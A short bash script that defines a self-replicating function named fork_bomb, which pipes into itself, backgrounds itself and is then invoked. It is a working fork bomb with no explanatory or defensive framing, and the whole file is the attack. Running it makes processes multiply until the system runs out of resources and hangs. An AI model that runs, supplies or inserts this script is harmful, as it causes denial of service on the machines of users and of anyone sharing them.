#!/bin/bash

fork_bomb()
{
	fork_bomb | fork_bomb &
};
fork_bomb
